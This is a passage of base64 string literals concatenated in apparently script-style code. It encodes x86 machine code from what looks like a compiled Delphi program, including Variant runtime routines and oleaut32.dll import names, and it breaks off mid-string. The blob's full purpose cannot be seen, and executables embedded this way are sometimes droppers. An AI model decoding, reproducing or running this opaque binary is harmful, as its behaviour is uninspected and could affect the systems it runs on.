'wAToVab+/4vQi8uLhVD9//+LGP9TEGoAagAz0ouFUP3//4sI/1EYi4V0/f//i1gEhdt0BYPrBIsbi4VQ/f//ixD/ElJQi8OZA4VI/f//E5VM/f//O1QkBHUDOwQkWlgPhcAGAAD/tUz9////tUj9//+LhVD9///oYMv+/4uFdP3//4tAKIXAdAmD+AoPhQABAACLhXT9//+DwBzo8KD+/4uFdP3//4PAIOjioP7/x4VE/f//AQAAALgAAQAA6PJC' + 
'//+L0I2FEP3//+ipov7/i5UQ/f//i4V0/f//g8Ag6FWj/v+DvUT9//8Qfyu4AAEAAOi+Qv//i9CNhQz9///odaL+/4uVDP3//4uFdP3//4PAHOgho/7//4VE/f//g71E/f//IXWSi4V0/f//g8AkUIuFdP3//4tIHIuFdP3//4tQII2FCP3//+g3o/7/i4UI/f//i5V0/f//jUoMi5V0/f//g8IU6CqQ//+NlQT9//+LhXT9//+LQCToblz//4uV' + 
'BP3//4uFdP3//4PAJOhSoP7/i4V0/f//g3goCnUNi4V0/f//M9KJUCjrCYuFdP3///9AKGoAaABAAACLhUj9//+LlUz9///oRLD+/4mFOP3//4mVPP3//2oAaABAAACLhTj9//+LlTz9///o/K/+/4P6AHUJPQAABAB2GOsCfhTHhTj9//8QAAAAx4U8/f//AAAAAIO9PP3//wB1B4O9OP3//wB0Nf+1PP3///+1OP3//4uFSP3//4uVTP3//+jN' + 
'r/7/iYUw/f//iZU0/f//x4Us/f//AEAAAOs4x4U4/f//AQAAAMeFPP3//wAAAACLhUj9//+JhTD9//+LhUz9//+JhTT9//+LhUj9//+JhSz9//+NRfDo9Z7+/7IBoahwQADoyZH+/4mFHP3//4udOP3//4XbD46fAAAAx4VE/f//AQAAAP+1NP3///+1MP3//4uFRP3//0iZ6A6v/v+JhSD9//+JlST9//+NlSD9//+5CAAAAIuFHP3//4sw/1YQ' + 
'/7Uk/f///7Ug/f//M9KLhVD9//+LCP9RGI1F9IuVLP3//+gJpf7/jUX06C2j/v+L0IuNLP3//4uFUP3//+heyf7/jUXwi1X06Oug/v//hUT9//9LD4Vr////agBqADPSi4Uc/f//iwj/URiNRezoHZ7+/4uFHP3//4sQ/xKJhRj9//+NReyLlRj9///on6T+/41F7OjDov7/i9CLjRj9//+LhRz9//+LGP9TDGoAagAz0ouFHP3//4sI/1EYjZUY' + 
'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' + 
'eUMAVbqYsEEAuBy3QQDocf///1mjxHlDAFW6mLBBALgkt0EA6Fv///9Zo8h5QwBVupiwQQC4LLdBAOhF////WaPMeUMAVbqYsEEAuDS3QQDoL////1mj0HlDAFW6mLBBALg8t0EA6Bn///9Zo9R5QwBVupiwQQC4RLdBAOgD////WaPYeUMAVbqYsEEAuEy3QQDo7f7//1mj3HlDAFW6mLBBALhUt0EA6Nf+//9Zo+B5QwBVupiwQQC4XLdBAOjB' + 
'/v//WaPkeUMAVbqksEEAuGS3QQDoq/7//1mj6HlDAFW6sLBBALhst0EA6JX+//9Zo+x5QwBVuhyxQQC4fLdBAOh//v//WaPweUMAVbqIsUEAuIy3QQDoaf7//1mj9HlDAFW69LFBALict0EA6FP+//9Zo/h5QwBVumCyQQC4rLdBAOg9/v//WaP8eUMAVbrMskEAuLy3QQDoJ/7//1mjAHpDAFW6TLNBALjMt0EA6BH+//9ZowR6QwBVuryzQQC4' + 
'3LdBAOj7/f//WaMIekMAVbowtEEAuOy3QQDo5f3//1mjDHpDAFldw29sZWF1dDMyLmRsbAAAAABWYXJpYW50Q2hhbmdlVHlwZUV4AFZhck5lZwAAVmFyTm90AABWYXJBZGQAAFZhclN1YgAAVmFyTXVsAABWYXJEaXYAAFZhcklkaXYAVmFyTW9kAABWYXJBbmQAAFZhck9yAAAAVmFyWG9yAABWYXJDbXAAAFZhckk0RnJvbVN0cgAAAABWYXJS' + 
'NEZyb21TdHIAAAAAVmFyUjhGcm9tU3RyAAAAAFZhckRhdGVGcm9tU3RyAABWYXJDeUZyb21TdHIAAAAAVmFyQm9vbEZyb21TdHIAAFZhckJzdHJGcm9tQ3kAAABWYXJCc3RyRnJvbURhdGUAVmFyQnN0ckZyb21Cb29sAFWL7DPAVWghuEEAZP8wZIkg/wUQekMAM8BaWVlkiRBoKLhBAMPp1of+/+v4XcOLwMyDRCQE+ItEJASLAP8gg0QkBPjp' + 
'0CUAAINEJAT46dIlAAAtuEEAOrhBAES4QQABAAAAAAAAAAAAAADAAAAAAAAARk64QQAIAAAAAAAAAIvAyLhBAFq4QQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEuUEADAAAAGQQQADsPEAA+DxAAPw8QAAAPUAA9DxAAHg6QACUOkAAKN1BACzeQQC43UEA7N1BAMzdQQAI3kEAtN1BACjcQQBg3EEA7NxBADQzQAA0M0AAHNxBAADeQQC03EEA' + 
'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' + 
'iYXo/P//i4Xo/P//g8AEUI1HAVCLhfj8//9Q6Ezw///oJ/7//42F9Pz//1CNRwFQi4X4/P//UOg48P//6Av+//+Lhej8//+LlfT8//8rUARCi4Xo/P//iRBHg8YIS3Wei53w/P//S4XbfBpDjYUE/f//jZUA////iwiJCoPCBIPACEt181WLnfD8//9Li8PoTP7//1mEwHQqjYXs/P//UI2FAP///1CLhfj8//9Q6Mnv///olP3//4uF7Pz//+ih' + 
'AAAAVYvD6EX+//9ZhMB1tYuF/Pz//1DoKOv//+hr/f//X15bi+Vdw1NWUYvYD7czZoP+FHMNU+gI6///6Ev9///rXGaB/gABdQ9mxwMAAI1DCOh5gv7/60Zmgf4BAXUKi8P/FSh6QwDrNWb3xgAgdAmLw+g0/v//6yWL1IvG6NEYAACEwHQMi9OLBCSLCP9RJOsMU+ir6v//U+id6v//Wl5bw5Bm9wDov3UGZscAAADD6HL////DkFDo5v///1jD' + 
'VYvsU4tNCIHBAP3//4tUwQQDFMGLXQg7lIMA////D5/CSITSdASFwH3ji8JbXcOQVYvsU1ayAYtNCP+EgQD///+LTQiLjMEE/f//i9mLdQgDnMYA/f//i3UIO5yGAP///38ihcB1BDPS6xqLVQiLVQiJjIIA////i1UIUkjorv///1mL0IvCXltdw5BVi+yBxOD8//9TVleJjfj8//+L2omF/Pz///ZDASB1CrhXAAeA6Bb8//8PtwOL0GaB4v8P' + 
'ZoP6DA+FcwEAAPbEQHQNi0MIiwCJhez8///rCYtDCImF7Pz//4uF7Pz//w+3AImF8Pz//4ud8Pz//0uF23xrQzP/jbUA/f//i8aJheD8//+LheD8//+DwARQjUcBUIuF7Pz//1Dowu3//+id+///jYX0/P//UI1HAVCLhez8//9Q6K7t///ogfv//4uF4Pz//4uV9Pz//ytQBEKLheD8//+JEEeDxghLdZ6NhQD9//9Qi4Xw/P//UGoM6GXt//+L' + 
'8IX2dQXomvj//4uF/Pz//+hP/v//i4X8/P//ZscADCCLhfz8//+JcAiLnfD8//9Lhdt8GkONhQT9//+NlQD///+LCIkKg8IEg8AIS3XzVYud8Pz//0uLw+gj/v//WYTAdEyNhej8//9QjYUA////UIuF7Pz//1DoAO3//+jL+v//jYXk/P//UI2FAP///1BW6Ofs///osvr//4uF6Pz//4vQi4Xk/P///5X4/P//VYvD6Pr9//9ZhMB1k+sSU4uF' + 
'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' + 
